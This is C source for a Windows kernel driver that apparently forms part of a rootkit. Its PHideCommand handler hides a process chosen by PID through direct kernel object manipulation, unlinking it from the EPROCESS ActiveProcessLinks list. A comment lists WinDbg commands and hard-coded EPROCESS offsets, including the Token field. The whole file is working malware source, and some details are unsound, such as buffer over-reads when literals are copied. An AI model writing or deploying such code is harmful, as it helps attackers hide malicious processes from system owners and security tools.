#include <ntifs.h>
#include <ntstrsafe.h>
#include "dbgmsg.h"
#include "IOCTLRoutines.h"

void PingCommand(PVOID inputBuffer, PVOID outputBuffer, ULONG inBufferLen, ULONG outBufferLen)
{
	UNREFERENCED_PARAMETER(inputBuffer);
	UNREFERENCED_PARAMETER(inBufferLen);
	DBG_TRACE("PingCommand", "Pinged.");
	
	CHAR* output = "pong";
	RtlCopyMemory(outputBuffer, output, outBufferLen);
	return;
}

// dt nt!_EPROCESS ffffd70a7e82d340 < cmd.exe

// Hide process via DKOM
/*
    Filter by field: .shell -ci "dt nt!_EPROCESS ffffde849d7c1340" findstr /i <field>
	Dump structure: dt nt!_EPROCESS <addr> (-b to recursively list, -v for verbose info like size, num fields)
	Convert formats: .formats <num>

	> uf nt!PsGetCurrentProcess
	[gs:[188h] + 0b8h] -> _EPROCESS

	_EPROCESS+440h -> UniqueProcessId
	_EPROCESS+4b8h -> Token
	_EPROCESS+448h -> ActiveProcessLinks
	_EPROCESS+5a8h -> ImageFileName
*/
void PHideCommand(PVOID inputBuffer, PVOID outputBuffer, ULONG inBufferLen, ULONG outBufferLen)
{
	UNREFERENCED_PARAMETER(inBufferLen);

	int pId = *(int*) inputBuffer;
	DBG_PRINT2("[PHideCommand] Asked to hide PID %u\n", pId);
	
	PEPROCESS proc;
	NTSTATUS result = PsLookupProcessByProcessId((HANDLE) pId, &proc);
	
	if (result != STATUS_SUCCESS)
	{
		DBG_PRINT2("[PHideCommand] Failed to get process with PID %u", pId);
		RtlCopyMemory(outputBuffer, "Failure", outBufferLen);
	}
	else
	{
		LIST_ENTRY activeProcessLinks = *((LIST_ENTRY*) ((CHAR*) proc + 0x448));
		activeProcessLinks.Blink->Flink = activeProcessLinks.Flink;
		activeProcessLinks.Flink->Blink = activeProcessLinks.Blink;	
		
		char* imageFileName = (char*)((CHAR*) proc + 0x5a8);
		
		DBG_TRACE("Image File Name", imageFileName);
		DBG_PRINT3("[PHideCommand] Hid process %s, PID: %u", imageFileName, pId);
	
		RtlStringCbPrintfA((NTSTRSAFE_PSTR) outputBuffer, outBufferLen, "Hid process %s, PID: %u", imageFileName, pId);
	}

	return;
}